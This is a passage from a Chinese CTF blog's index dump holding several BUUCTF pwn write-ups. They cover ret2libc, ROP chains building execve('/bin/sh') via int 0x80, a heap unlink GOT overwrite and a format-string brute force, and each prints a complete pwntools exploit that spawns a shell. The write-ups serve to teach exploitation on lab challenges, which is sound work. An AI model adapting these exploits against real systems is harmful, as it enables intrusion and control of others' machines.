+ pg(bin_sh_addr) + pg(system_addr) 完整 exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_en_2\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;29058\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;}) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) # 查找gadget的内置函数 if not if_32: rop_gadget = ROP(m_elf) pop_rdi: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] success(f\u0026#34;pop_rdi:{hex(pop_rdi)}\u0026#34;) success(f\u0026#34;ret:{hex(ret)}\u0026#34;) else: pop_rdi:int = 0 ret:int = 0 #需要自行设定offset offset:int = 0x58 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) success(f\u0026#34;main_addr:{hex(main_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(puts_plt) + pg(main_addr) + pg(0) + pg(puts_got) p.sendline(payload) # 得到真实地址 puts_addr:int = u32(p.recv(4)) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(pop_rdi) + pg(puts_got) + pg(puts_plt) + pg(main_addr) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.recv(1) # 得到真实地址 puts_addr:int = u64(p.recv(6)+b\u0026#34;\\x00\\x00\u0026#34;) # 计算得到基址和system地址 searcher = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) searcher.select_libc(0) base_addr:int = puts_addr - searcher.dump(\u0026#34;puts\u0026#34;) system_addr:int = base_addr + searcher.dump(\u0026#34;system\u0026#34;) bin_sh_addr: int = base_addr + searcher.dump(\u0026#34;str_bin_sh\u0026#34;) success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) success(f\u0026#34;base_addr:{hex(base_addr)}\u0026#34;) success(f\u0026#34;system_addr:{hex(system_addr)}\u0026#34;) success(f\u0026#34;bin_sh_addr:{hex(bin_sh_addr)}\u0026#34;) # 发送payload p.recvuntil(b\u0026#34;Input your choice!\\n\u0026#34;) p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) if if_32: payload = b\u0026#34;a\u0026#34;*offset + pg(system_addr) + pg(0) + pg(bin_sh_addr) p.sendline(payload) else: payload = b\u0026#34;\\0\u0026#34;*offset + pg(ret) + pg(pop_rdi) + pg(bin_sh_addr) + pg(system_addr) p.sendline(payload) p.sendline(payload) p.recvuntil(\u0026#34;Ciphertext\\n\u0026#34;) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/libsearcherciscn_2019_en_2/","section":"writeup","summary":"Do you want to know who you are? Don\u0026rsquo;t ask. Act! Action will delineate and define you. — Thomas Jefferson 原题链接和这道题是一道题，一模一样的 【Write-up】BUUCTF ciscn_2019_en_2 checksec 查看程序架构 ida 查看程序伪代码 构建 exp 完整","tags":["pwn","LibSearcher"],"title":"【LibSearcher】ciscn_2019_en_2"},{"categories":["writeup"],"contents":" People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. — Rogers Hornsby\n原题链接\n\u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file not_the_same_3dsctf_2016 [*] \u0026#39;/home/peterl/security/workspace/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位程序带堆防护\n同时，如果我们使用 ldd命令，就会发现这个程序是一个静态链接程序\nida查看程序伪代码 我们发现主函数很简单就能栈溢出，那我们再找找有没有后门函数\n结果发现了get_secret函数：\n我们发现这个后门函数实在有点特殊，主要逻辑是打开目录下的flag.txt文件，然后读入开头的至多45个字符入fl4g变量，我们双击fl4g变量发现其地址为：\n构建exp 我们使用readelf -s命令查看一下程序的符号表：\n$ readelf -s not_the_same_3dsctf_2016 | grep fl4g 1506: 080eca2d 45 OBJECT GLOBAL DEFAULT 24 fl4g $ readelf -s not_the_same_3dsctf_2016 | grep printf ... 901: 0804f0a0 30 FUNC GLOBAL DEFAULT 5 printf ... 那么我们的基本思路就是，先栈溢出调用后门函数，然后调用输出函数printf输出fl4g\npayload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) 注意，这里一定要使用exit退出，这里的exit起了一个return语句的作用\n完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./not_the_same_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;28534\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x8048A00\u0026#34;) else: p = process(fn) m_elf = ELF(fn) backdoor = 0x80489a0 p.clean() # 这里不能直接recvuntil，因为printf不刷新缓冲区，pwntools这种用管道的工具无法接收到任何字符 # p.recvuntil(\u0026#34;b0r4 v3r s3 7u 4h o b1ch4o m3m0... \u0026#34;) payload = b\u0026#34;a\u0026#34;*0x2D + pg(backdoor) + pg(m_elf.sym[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;exit\u0026#39;]) + pg(m_elf.symbols[\u0026#39;fl4g\u0026#39;]) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/printf%E4%B8%8D%E5%88%B7%E6%96%B0%E7%BC%93%E5%86%B2%E5%8C%BAnot_the_same_3dsctf_2016/","section":"writeup","summary":"People ask me what I do in winter when there\u0026rsquo;s no baseball. I\u0026rsquo;ll tell you what I do. I stare out the window and wait for spring. — Rogers Hornsby 原题链接 \u0026quot;【Write-up】BUUCTF not_the_same_3dsctf_2016 checksec查看程序架构 ida查","tags":["pwn","printf不刷新缓冲区","无回显"],"title":"【printf不刷新缓冲区】not_the_same_3dsctf_2016"},{"categories":["writeup"],"contents":" The most formidable weapon against errors of every kind is reason. — Thomas Paine\n原题链接\n直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流：\nexec 1\u0026gt;\u0026amp;0 cat flag ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/","section":"writeup","summary":"The most formidable weapon against errors of every kind is reason. — Thomas Paine 原题链接 直接给了shell，但是把输出流关了 这时候我们可以用shell重定向输出流到输入流： exec 1\u0026gt;\u0026amp;0 cat flag","tags":["pwn","shell重定向"],"title":"【shell重定向】BUUCTF wustctf2020_closed"},{"categories":["writeup"],"contents":" We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. — Buddha\n原题链接\n在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016 checksec 查看架构 ida 查看程序（伪）代码 main 函数 后门函数 构建 exp 通过后门函数构建 exp 完整 exp1 通过 syscall 构建 exp 没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 完整 exp2 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 无法执行其他二进制文件 checksec 查看架构 看来是 32 位的程序。我们首先就要想到，32 位程序的参数传递方式和 64 位程序的是不一样的：\n32 位将参数从右到左先后压入栈中 64 位程序将参数分别用 RDI,RSI,RCX,RDX,R8,R9 作为第 1-6 个参数，用 RAX 保存返回值 所以，我们调用 system 函数的思路就不一样了。我们就不需要 pop rdi;ret 这个 gadget（在 32 位程序中也找不到），而是只需要注意用 ret 这个 gadget 保持栈返回时最后一位为 0 即可（system 特殊规定），可以参考这里\n但是如果程序很好心地为我们提供了后门函数，那上面的这些也不用考虑了\n同时，我们要注意 32 位程序由于参数保存在栈中，call 的同时还会将【下一条指令的偏移】压入栈中，因此我们要为【下一条指令的偏移】预留出位置\nida 查看程序（伪）代码 main 函数 看来是简单的栈溢出\n值得注意的是，这里有一个小坑，即 printf 和 puts 的区别。\nprintf 在调用完后并不会马上打印出字符串，而是等待刷新缓冲区的指令之后才显示字符串。在这里就体现为，到 gets 函数向用户请求输入时，还没有任何字符串显示。\n因此，可能有人会在写 exp 的时候，一直等待字符串输出，看一直没反应还以为自己 payload 写错了（\n具体的 printf 和 puts 的区别可以看这位大佬的博文，非常详细\n后门函数 然后我们就发现了程序好心为我们提供的后门函数（\n只要我们传入参数分别为 814536271 和 425138641，那么我们就能得到 flag 的内容\n构建 exp 通过后门函数构建 exp 步骤如下：\n首先我们要找到 offset 溢出到 return 的栈地址，这通过 ida 很容易发现\r然后我们就将后门函数地址和参数值填入栈中即可 # pg = p32 payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) 然后直接 sendline 就 🆗 啦\n完整 exp1 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25191\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn) payload = b\u0026#34;a\u0026#34;*0x38 + pg(0x80489a0) + pg(0) + pg(814536271) + pg(425138641) p.sendline(payload) p.interactive() 通过 syscall 构建 exp 我们通过 ida 可以得知，该程序 plt 表内没有 system 函数也没有 execve 函数，同时此题又是静态编译，就不能适用 ret2libc 的方法从 libc 中找到 system。\n但是我们可以通过程序中断时产生的系统调用来执行 execve 这个中断程序\n全部中断程序编号见此\n这里我们只需要找到 59 号中断程序，向它传参即可\n64 位编号是 59，也就是 0x3b\n32 位编号是 11，也就是 0xb。\n同时，因为我们的程序是 32 位的，我们需要将编号传给 eax 寄存器，剩余参数分别传入 ecx,edx,esi,edi,ebp 中\n然后，我们要找到这几个参数对应的值。execve 函数后两个参数可以不管设为 0，但是第一个参数应该是/bin/sh或者sh\n为了将这几个参数送入寄存器中，我们还需要一个 gadget，不仅可以完成任务，还可以通过ret指令接着读下一条指令\n我们用ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot; | grep eax找 gadget：\n比较遗憾的是，没有刚刚好的 gadget，但是有一条勉强可用：\n0x080b91e6 : pop eax ; ret 那我们继续找 ebx、ecx、edx：\n$ROPgadget --binary get_started_3dsctf_2016 --only \u0026#34;pop|ret\u0026#34; | grep ebx 0x0809e102 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809e0fa : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805bf3d : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e4c4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x0809a7dc : pop ebx ; pop edi ; ret 0x0806fc09 : pop ebx ; pop edx ; ret 0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret 0x080483b7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a25b6 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096b1e : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x080718b1 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0804ab66 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049a95 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x080509a5 : pop ebx ; pop esi ; pop edi ; ret 0x080498af : pop ebx ; pop esi ; pop edi ; ret 4 0x08049923 : pop ebx ; pop esi ; ret 0x080481ad : pop ebx ; ret 0x080d413c : pop ebx ; ret 0x6f9 0x08099f96 : pop ebx ; ret 8 0x0806fc31 : pop ecx ; pop ebx ; ret 0x08063adb : pop edi ; pop esi ; pop ebx ; ret 0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 0x0809e0f9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0807b1b0 : pop es ; pop ebx ; ret 0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret 0x0805d090 : pop esi ; pop ebx ; ret 0x0805b8a0 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0809efe2 : pop ss ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 其中，有一条一下子就能同时设置三个需要用的寄存器：\n0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret 那现在我们的栈从低到高就应该是 eax-\u0026gt;edx-\u0026gt;ecx-\u0026gt;ebx 然后我们需要找到int 0x80这个 32 位系统调用 system call 的中断指令（64 位就是 syscall）：0x0806d7e5 : int 0x80 然后我们需要找到填入 ebx 寄存器的/bin/sh。结果是没有/bin/sh PS.这里不能直接找sh字符串，因为 execve 函数第一个参数是 path，必须是绝对地址，而且必须是二进制文件（或者脚本文件，但是只会执行!#之后的那个解释器）。在 Linux 系统种的sh命令是软链接，并不是二进制文件\n具体可以查看这篇博客，这篇博客也很不错\n没有现成\u0026quot;/bin/sh\u0026quot;：构建字符串 这题是静态链接，没法 ret2libc。\n但是，我们可以找一处没有用到的地址，利用一些 gadget 将我们需要的值写进去，然后我们就得到了一个程序可以使用的\u0026quot;/bin/sh\u0026quot;字符串地址！\n首先我们需要一条指令，支持我们向内存中写入值，这样我们就可以 pop 栈中的值到寄存器，再将空闲内存的地址赋给另一个寄存器，这样就可以向空闲地址写入值了\n通过ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;mov|ret\u0026quot;命令然后我们找到了这个可用的 gadget：\n# dword表示双字，就是四个字节，刚好是32位寄存器的大小 0x080557ab : mov dword ptr [edx], eax ; ret 然后我们可以直接利用之前找到过的pop edx;pop ecx;pop ebx;ret将地址弹到 edx 中\n然后我们用 ida 找到一块闲置空间（一直滚到.data 段，最后有一小段重复的 db 0）\n然后我们就可以完成我们的 payload 了：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 完整 exp2 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; # libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if_debug: bool = False if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: shell = gdb.debug(fn, \u0026#34;b* 0x8048A40\u0026#34;) else: p = process(fn) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) if if_debug: shell.sendline(payload) shell.interactive() else: p.sendline(payload) p.interactive() 一些悬而未决的小问题 作者试图不使用pop edx;pop ecx;pop ebx;ret只使用pop edx;ret 我们用 ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot;命令找到了pop edx的命令\n0x0806fc0a : pop edx ; ret 看起来似乎没有问题\n令人疑惑的是，这样子连栈都没法写入(在 pop eax 后就是连串的 popal)，可能是我找的这个 gadget 本身有点小问题\n但是我尝试了pop ecx;pop ebx;ret和mov [ecx+4], eax，程序完全正常运作，可以正常得到 shell\npayload 如下：\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 # 这里一定要-4，因为gadget加了4 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_ecx_ebx_ret) + \\ pg(spare_space-4)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) 无法执行其他二进制文件 作者一开始试图execve(\u0026quot;sh\u0026quot;, 0, 0)，但是查阅资料后明白只能执行二进制文件，于是又试图执行/bin/ls和/usr/bin/python3.10，但是均因不明原因失败了\n如果各位看官知道了原因，可以劳烦您在评论区为作者和后来人作一番解释吗？感激不尽！\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/","section":"writeup","summary":"We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. — Buddha 原题链接 在做题前，我先为其建立了一个专门的工作目录： 【syscall】【Write-up】BUUC","tags":["pwn","syscall"],"title":"【syscall】get_started_3dsctf_2016"},{"categories":["writeup"],"contents":" Friendship always benefits; love sometimes injures. — Seneca the Younger\n原题链接\nchecksec查看程序架构 ida查看伪代码 典型的堆菜单题\n介绍一下unlink unlink其实就是很普通，很常规的一种从双向链表中取出节点的机制\n当我们free掉一个chunk的时候，程序会查看相邻的chunk时候也被free掉了，如果也被free掉了，就把它从双向链表中取出来（注意fastbin是单向链表），执行unlink，与当前free的chunk合并，然后放入它应该去的bin中\n我们的chunk有fd和bk两个域，分别指向（链表中）前一个chunk和后一个chunk，也就是说，fd域里保存的是前一个chunk的地址，bk是后一个chunk的地址\nunlink会更改chunk0和chunk2的的fd和bk指针，也就是说\nchunk0-\u0026gt;bk = chunk2 chunk2-\u0026gt;fd = chunk0 又因为fd和bk在同样位数的系统，比如64位的系统下，相较于chunk指针的偏移是固定的，因此，上面的代码又等价于\n*(chunk0 + 0x18) = chunk2 *(chunk2 + 0x10) = chunk0 而此时，如果我们要unlink的chunk的fd域和bk域，则上面的代码会产生这样的效果： *(ptr1 + 0x18) = ptr2 *(ptr2 + 0x10) = ptr1 那么，我们就可以更改ptr1下方0x10位置和0x18位置的值了！\n但是这个unlink机制还存在着一系列安全检查：\n这些检查确保：\n要进行unlink的chunk的size位和当前被free的chunk的prev_size位相同，同时它的prev_inuse位要置零 要进行unlink的chunk的上一个chunk的bk位指向当前chunk，下一个chunk的fd位指向当前chunk 也就是说： *(ptr1 + 0x18) == chunk1 *(ptr2 + 0x10) == chunk1 如何绕过？ 系统期待的是上一个chunk的bk域内存的值是chunk1，下一个chunk的fd域内存的值也是chunk1，当我们可以让\nptr1 = \u0026amp;chunk1 - 0x18 ptr2 = \u0026amp;chunk1 - 0x10 这样就可以绕过检查，这样最后的结果就是：\nchunk1 = \u0026amp;chunk1 - 0x10 chunk1 = \u0026amp;chunk1 - 0x18 我们让chunk1变成了存放chunk1的内存上方0x18这个地址\n然后我们就可以更改存放chunk1的内存的值，就可以实现任意地址写！\n本题思路 申请三块0x80的chunk，在第一块chunk内伪造一个0x70的已free的chunk，然后更改下一个chunk的prev_size位和size位从而实现unlink\n然后我们可以更改存放chunk1的内存的值，将其改为atoi的got值，我们就可以泄露出libc的基址\n然后我们又可以更改atoi的got值，改为system，再传入\u0026quot;/bin/sh\\x00\u0026quot;即可\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./bamboobox\u0026#34; libc_name:str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;27469\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400E42 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def show(index: int) -\u0026gt; bytes: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(f\u0026#34;{index} : \u0026#34;) return p.recv(6) def add(size: int, name: str): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(size)) p.clean() p.sendline(name) def change(index: int, name: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(name)+1)) p.clean() p.sendline(name) def remove(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) ptr = 0x6020c8 add(0x80, b\u0026#34;0\u0026#34;) add(0x80, b\u0026#34;1\u0026#34;) add(0x80, b\u0026#34;/bin/sh\\x00\\x00\u0026#34;) payload = (pg(0) + pg(0x80) + pg(ptr - 0x18) + pg(ptr - 0x10)).ljust(0x80, b\u0026#34;\\x00\u0026#34;) + pg(0x80) + pg(0x90) change(0, payload) remove(1) payload = b\u0026#34;\\x00\u0026#34;*0x10 + pg(0x80) + pg(m_elf.got[\u0026#39;atoi\u0026#39;]) change(0, payload) libcbase = u64(show(0).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;atoi\u0026#39;] success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] change(0, pg(system_addr)) p.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;/bin/sh\\x00\u0026#34;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/","section":"writeup","summary":"Friendship always benefits; love sometimes injures. — Seneca the Younger 原题链接 checksec查看程序架构 ida查看伪代码 典型的堆菜单题 介绍一下unlink unlink其实就是很普通，很常规的一种从双","tags":["pwn","unlink","堆"],"title":"【unlink】BUUCTF hitcontraining_unlink"},{"categories":["writeup"],"contents":" The longer we dwell on our misfortunes, the greater is their power to harm us. — Voltaire\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp checksec查看程序架构 $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 整个程序反编译出来逻辑非常混乱，但重要的只有三个函数： 有一个后门函数\n这个函数说明了buf也就是保存字符串的地址在堆中\n这个函数说明会将buf中的字符串以|为分割符分割成多个子字符串并打印\n这个程序因为只有一次输入的机会，而且无法更改ret值，所以获取shell权限要一次到位地完成，因此虽然可以泄露栈地址却难以加以利用。\n因此如果我们要更改栈地址，就需要用到爆破\n构建exp ASLR对栈的影响 首先，每次加载程序的时候，栈基址都是不一样的，但是后12位为0\n其次，因为页对齐的影响，因此栈地址除了栈基址还要加上一个页地址，这个页地址一定是4KB的整数倍，也就是说，这个页地址对最后12位是没有影响的\n然后，栈地址还要加上一个偏移，这个偏移会对栈地址后12位造成影响，经过调试发现，同一个地址在每次运行的时候，最后4位也就是地址的最后一个16进制数是不变的\n且看下述程序：\n#include\u0026lt;stdio.h\u0026gt; int main(void){ int a = 1; printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a); return 0; } 运行结果：\n可以看到，对于64位程序，栈地址也是只有最后一位不变\n我们再来看下32位程序的情况：\n结论和64位程序是一样的\n笔者也不知道产生此现象的根本原因，只能当作一个既定事实记了。如果有师傅知道此现象的原因，希望能在评论区留下您的解释，感谢您的付出！\n笔者猜测原因：每次程序开始时会保证栈地址最后一位为0，这样经过既定数量的pop和push，在同一个相对位置的栈地址的最后一位是不变的\n构建地址链 如图，如果我们用%hhn将ebp位置指向的地址改为ret地址，那么0xffffd3b8保存的地址就是ret地址，这样子我们就可以通过第三个红框框这条链来更改ret地址了\n爆破 上述逻辑有一个问题，就是我们需要更改栈地址的末一个字节，而这个字节的高四位是不确定的，所以我们如果更改，则只有$\\frac{1}{16}$的几率成功，那么我们就加一个while循环多试几次就好了\n完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher import sys pss: bool = False fn: str = \u0026#34;./xman_2019_format\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;28711\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] if_debug: bool = False m_elf = ELF(fn) libc = ELF(libc_name) backdoor = 0x80485AB offset1 = 10 len1 = 0x6c offset2 = 18 len2 = 0x85AB format_string = f\u0026#39;%{len1}c%{offset1}$hhn|%{len2}c%{offset2}$hn\u0026#39; success(format_string) while(True): if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x400BA1\u0026#34;,) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) p.clean() p.send(format_string) gdb.attach(p, \u0026#34;b* 0x804860B\u0026#34;) p.clean() try: p.interactive() except: info(\u0026#34;failed!\u0026#34;) p.close() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/","section":"writeup","summary":"The longer we dwell on our misfortunes, the greater is their power to harm us. — Voltaire 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp chec","tags":["pwn","爆破栈末位"],"title":"【爆破栈末位】xman_2019_format"},{"categories":["writeup"],"contents":" Never complain and never explain. — Benjamin Disraeli\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 有canary，那传统的栈溢出肯定不行了\nida查看程序伪代码 